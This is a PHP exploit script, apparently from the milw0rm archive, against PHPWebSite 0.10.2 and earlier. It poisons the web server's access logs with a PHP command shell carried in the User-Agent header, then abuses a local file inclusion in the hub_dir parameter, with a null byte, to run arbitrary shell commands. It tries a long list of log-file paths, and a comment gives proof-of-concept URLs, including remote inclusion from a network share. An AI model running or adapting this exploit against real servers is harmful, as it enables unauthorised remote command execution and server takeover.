#!/usr/bin/php -q -d short_open_tag=on
<?
echo "PHPWebSite <= 0.10.2 remote cmmnds xctn\r\n";
echo "-> arbitrary local inclusion, works with magic_quotes_gpc = Off\r\n";
echo "by rgod, mail: rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";

if ($argc<4) {
echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to phpwebsite\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /phpwebsite/ ls -la\r\n";
die;
}

/* explaination:
 vulnerable code in index.php at lines 21-29:

...
 if (!isset($hub_dir)) {
    $hub_dir = NULL;
}
if (!preg_match ("/:\/\//i", $hub_dir)) {
    loadConfig($hub_dir);
} else {
    exit('FATAL ERROR! Hub directory was malformed.');
}
...

and at lines 125-143:

...
function loadConfig($hub_dir){

    if (file_exists($hub_dir . 'conf/config.php')) {
 	if (filesize($hub_dir . 'conf/config.php') > 0) {
	    include($hub_dir . 'conf/config.php');

	    define('PHPWS_SOURCE_DIR', $source_dir);


	} else {

	    header('Location: ./setup/set_config.php');
	    exit();
	}
    } else {
	header('Location: ./setup/set_config.php');
	exit();
    }
}
....

so, you can include files from local resources, poc:

http://[target]/[path]/index.php?hub_dir=/var/log/httpd/access_log%00

you don't see output, but we have some code in log files, it will be executed

also, on php5, arbitrary remote inclusion:

http://[target]/[path]/index.php?hub_dir=\\192.168.1.3\c\

including a full accessible share
where on samba resource you have some code in conf/config.php
									      */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
    $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
    }
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$cmd="";$port=80;$proxy="";

for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "[1] Injecting some code in log files...\r\n";
$CODE ='<?php ob_clean();echo 666;if (get_magic_quotes_gpc()) {$_GET[cmd]=striplashes($_GET[cmd]);}';
$CODE.='passthru($_GET[cmd]);echo 666;die;?>';
$packet.="GET ".$path.$CODE." HTTP/1.1\r\n";
$packet.="User-Agent: ".$CODE."\r\n";
$packet.="Host: ".$serv."\r\n";
$packet.="Connection: close\r\n\r\n";
#debug
#echo quick_dump($packet);
sendpacketii($packet);
sleep(2);

# fill with possible locations
$paths= array (
  "/var/log/httpd/access_log",
  "/var/log/httpd/error_log",
  "../apache/logs/error.log",
  "../apache/logs/access.log",
  "../../apache/logs/error.log",
  "../../apache/logs/access.log",
  "../../../apache/logs/error.log",
  "../../../apache/logs/access.log",
  "../../../../apache/logs/error.log",
  "../../../../apache/logs/access.log",
  "/etc/httpd/logs/acces_log",
  "/etc/httpd/logs/acces.log",
  "/etc/httpd/logs/error_log",
  "/etc/httpd/logs/error.log",
  "/var/www/logs/access_log",
  "/var/www/logs/access.log",
  "/usr/local/apache/logs/access_log",
  "/usr/local/apache/logs/access.log",
  "/var/log/apache/access_log",
  "/var/log/apache/access.log",
  "/var/log/access_log",
  "/var/www/logs/error_log",
  "/www/logs/error.log",
  "/usr/local/apache/logs/error_log",
  "/usr/local/apache/logs/error.log",
  "/var/log/apache/error_log",
  "/var/log/apache/error.log",
  "/var/log/access_log",
  "/var/log/error_log",
);

for ($i=0; $i<=count($paths)-1; $i++)
{
  $j=$i+2;
  echo "[".$j."] Trying with ".$paths[$i]."%00\r\n";
  $xpl=$paths[$i];
  $packet ="GET ".$p."index.php?cmd=".$cmd."&hub_dir=".$xpl."%00 HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  #debug, shows packets in a nice format
  #echo quick_dump($packet);
  sendpacketii($packet);
  if (strstr($html,"666")){
    echo "Exploit succeeded...\r\n";
    $temp=explode("666",$html);
    echo $temp[1];
    die;
  }
}
#if you are here...
echo "Exploit failed...";
?>

# milw0rm.com [2006-04-14]
